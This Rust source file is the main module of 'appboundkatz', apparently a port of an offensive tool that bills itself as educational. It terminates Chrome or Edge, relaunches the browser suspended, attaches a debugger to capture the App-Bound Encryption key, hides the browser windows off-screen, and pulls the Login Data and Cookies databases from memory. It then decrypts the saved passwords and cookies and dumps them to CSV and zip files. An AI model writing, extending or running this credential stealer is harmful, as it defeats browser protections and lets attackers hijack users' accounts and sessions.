mod crypto;
mod db;
mod debug;
mod mem;
mod pe;
mod process;
mod report;

use std::process::exit;
use std::thread;
use std::time::{Duration, Instant};

use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::System::Diagnostics::Debug::{
    DebugActiveProcess, DebugActiveProcessStop, DebugSetProcessKillOnExit,
};
use windows::Win32::System::Threading::{ResumeThread, TerminateProcess, PROCESS_INFORMATION};

use crate::db::{CookieRow, LoginRow};

const CHROME_EXE: &str = r"C:\Program Files\Google\Chrome\Application\chrome.exe";
const EDGE_EXE: &str = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe";

/// How long to wait for the spawned browser to load its profile databases.
const PROFILE_DB_TIMEOUT: Duration = Duration::from_secs(15);

struct BrowserSpec {
    name: &'static str,
    exe: &'static str,
    module: &'static str,
    /// Chrome keeps the key pointer in R15 at the breakpoint, Edge in R14.
    edge: bool,
}

fn file_name(path: &str) -> &str {
    path.rsplit(['\\', '/']).next().unwrap_or(path)
}

fn banner() {
    println!("______ _                 _   _             _  __     _        ");
    println!("|  ____| |               | | (_)           | |/ /    | |       ");
    println!("| |__  | | _____   ____ _| |_ _  ___  _ __ | ' / __ _| |_ ____ ");
    println!("|  __| | |/ _ \\ \\ / / _` | __| |/ _ \\| '_ \\|  < / _` | __|_  / ");
    println!("| |____| |  __/\\ V / (_| | |_| | (_) | | | | . \\ (_| | |_ / /  ");
    println!("|______|_| \\___| \\_/ \\__,_|\\__|_|\\___/|_| |_|_|\\_\\__,_|\\__/___| ");
    println!("appboundkatz - educational Rust port of ElevationKatz by Meckazin");
    println!("Captures the current user's Chrome/Edge App-Bound Encryption key and");
    println!("dumps the default profile's saved passwords and cookies. No elevation:");
    println!("only processes of the user running this tool are ever touched.\n");
}

fn main() {
    banner();

    let specs = [
        BrowserSpec {
            name: "Chrome",
            exe: CHROME_EXE,
            module: "chrome.dll",
            edge: false,
        },
        BrowserSpec {
            name: "Edge",
            exe: EDGE_EXE,
            module: "msedge.dll",
            edge: true,
        },
    ];

    let mut logins: Vec<LoginRow> = Vec::new();
    let mut cookies: Vec<CookieRow> = Vec::new();

    for spec in &specs {
        if let Some((browser_logins, browser_cookies)) = process_browser(spec) {
            println!(
                "[+] {}: {} password(s), {} cookie(s)",
                spec.name,
                browser_logins.len(),
                browser_cookies.len()
            );
            logins.extend(browser_logins);
            cookies.extend(browser_cookies);
        }
        println!();
    }

    if logins.is_empty() && cookies.is_empty() {
        eprintln!("[-] Nothing was captured from either browser");
        exit(1);
    }

    if let Err(e) = report::write_reports(&logins, &cookies) {
        eprintln!("[-] Failed to write reports: {e}");
        exit(1);
    }

    println!(
        "[+] Wrote passwords.csv, cookies.csv and browser_data.zip ({} password(s), {} cookie(s))",
        logins.len(),
        cookies.len()
    );
}

fn process_browser(spec: &BrowserSpec) -> Option<(Vec<LoginRow>, Vec<CookieRow>)> {
    println!("[*] Targeting {} ({})", spec.name, spec.exe);

    // A running instance would make the new process hand off its work and exit
    // before we can trap the decryption, so always start from a clean slate.
    process::terminate_matching(file_name(spec.exe));

    let pi = match process::spawn_suspended(spec.exe) {
        Ok(pi) => pi,
        Err(e) => {
            eprintln!("[-] {e} (is {} installed?)", spec.name);
            return None;
        }
    };
    println!(
        "[+] Started a suspended {} process, PID {}",
        spec.name, pi.dwProcessId
    );

    unsafe {
        if ResumeThread(pi.hThread) == u32::MAX {
            eprintln!("[-] ResumeThread failed");
            cleanup(&pi);
            return None;
        }
    }

    // Park the browser's windows off-screen while we work.
    process::park_windows_offscreen(pi.dwProcessId, PROFILE_DB_TIMEOUT + Duration::from_secs(10));

    if let Err(e) = unsafe { DebugActiveProcess(pi.dwProcessId) } {
        eprintln!("[-] DebugActiveProcess failed: {e}");
        cleanup(&pi);
        return None;
    }
    println!("[+] Debugger attached");

    let key = debug::run(pi.hProcess, pi.dwProcessId, spec.module, spec.edge);

    unsafe {
        let _ = DebugSetProcessKillOnExit(false);
        let _ = DebugActiveProcessStop(pi.dwProcessId);
    }

    let key = match key {
        Some(k) => k,
        None => {
            eprintln!("[-] Failed to capture the {} key", spec.name);
            cleanup(&pi);
            return None;
        }
    };
    println!(
        "[+] {} App-Bound Encryption key: {}",
        spec.name,
        key.iter().map(|b| format!("{b:02X}")).collect::<String>()
    );

    // Give the browser time to load its profile databases, then steal the
    // mapped images out of memory: Login Data lives in the browser process,
    // Cookies in the network service process.
    let (login_image, cookie_image) = gather_profile_databases(spec, pi.hProcess);

    let logins = match login_image {
        Some(image) => db::extract_logins(spec.name, &image, &key),
        None => {
            eprintln!("[-] The Login Data database was not found in memory");
            Vec::new()
        }
    };
    let cookies = match cookie_image {
        Some(image) => db::extract_cookies(spec.name, &image, &key),
        None => {
            eprintln!("[-] The Cookies database was not found in memory");
            Vec::new()
        }
    };

    cleanup(&pi);
    // Also take down the child processes the browser spawned.
    process::terminate_matching(file_name(spec.exe));

    if logins.is_empty() && cookies.is_empty() {
        eprintln!("[-] {} yielded no data", spec.name);
        return None;
    }

    Some((logins, cookies))
}

fn gather_profile_databases(
    spec: &BrowserSpec,
    main_process: HANDLE,
) -> (Option<Vec<u8>>, Option<Vec<u8>>) {
    let deadline = Instant::now() + PROFILE_DB_TIMEOUT;
    let mut login_image = None;
    let mut cookie_image = None;

    loop {
        if login_image.is_none() {
            login_image = db::find_default_profile_file(main_process, "Login Data");
        }
        if cookie_image.is_none() {
            if let Some(h) = process::open_network_process(file_name(spec.exe)) {
                cookie_image = db::find_default_profile_file(h, "Cookies");
                unsafe { let _ = CloseHandle(h); };
            }
        }

        if login_image.is_some() && cookie_image.is_some() {
            break;
        }
        if Instant::now() >= deadline {
            break;
        }
        if !process::is_alive(main_process) {
            eprintln!(
                "[-] The {} process exited while waiting for the profile databases",
                spec.name
            );
            break;
        }
        thread::sleep(Duration::from_secs(1));
    }

    (login_image, cookie_image)
}

fn cleanup(pi: &PROCESS_INFORMATION) {
    unsafe {
        let _ = TerminateProcess(pi.hProcess, 0);
        let _ = CloseHandle(pi.hThread);
        let _ = CloseHandle(pi.hProcess);
    }
}
